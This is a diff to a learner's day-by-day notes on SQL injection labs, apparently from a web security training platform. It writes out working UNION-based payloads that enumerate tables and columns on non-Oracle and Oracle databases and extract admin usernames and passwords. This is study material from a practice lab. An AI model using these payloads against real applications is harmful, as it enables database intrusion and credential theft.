@@ -1,5 +1,5 @@
 Day-1
-I have learnt about SQL injection and its types. 
+* I have learnt about SQL injection and its types. 
 With these, I also performed a hands-on lab on "Retrieving hidden data" and "Subverting application logic".
 
 1) In first lab, the idea was to comment all the rest of the sql query and just focus on the name and its always true statement. 
@@ -29,3 +29,30 @@ There were about 4 labs for the above topic:
    iv) retrieving multiple values in a single column:
       -all the steps are same as "retrieving data from other tables", just the difference is that we have to use the pipe command.
       -'union+select+null,username||'~'||password+from+users--
+
+Day-3
+* Listing the database contents on non-oracle databases
+
+    - first step is to get the number of columns from the table by brute-force hit and trial method.
+    - when we get the number of columns in the database, then we try get the datatype of the columns.
+    - after getting all the above details, next step is to get the user table and its contents
+    - '+union+select+table_name,null+from+information_schema.tables--
+    - the table we got is: "users_bbzkqc"
+    - now, we will access the details of the users_bbzkqc table 
+    - '+union+select+column_name,null+from+information_schema.columns+where+table_name='users_bbzkqc'--
+    - this gives us the username and password columns from which we can get the admin id and password.
+    - '+union+select+username_gxwcyr,password_eqadnj+from+users_bbzkqc-- 
+    - from this, we got the credentials.
+
+* Listing the database contents on oracle databases
+{in oracle database, one need to know that we cannot just union the data of the same table, we need to provide the table name for the columns we want to access}
+    - number of columns
+    - datatype of the columns data
+    - '+union+select+null,null+from+dual-- 
+    - now to get the table name for the user and password details
+    - '+union+select+table_name,null+from+all_tables--
+    - after the above query, we got the user table which consistes username and pasword columns
+    - '+union+select+column_name,null+from+all_tab_columns+where+table_name='USERS_DWZGPO'--
+    - the above query provides us the username and password column names.
+    - '+union+select+USERNAME_GMVJPI,PASSWORD_MYTJBV+from+USERS_DWZGPO--
+    - form the above command we got the admin id and password.
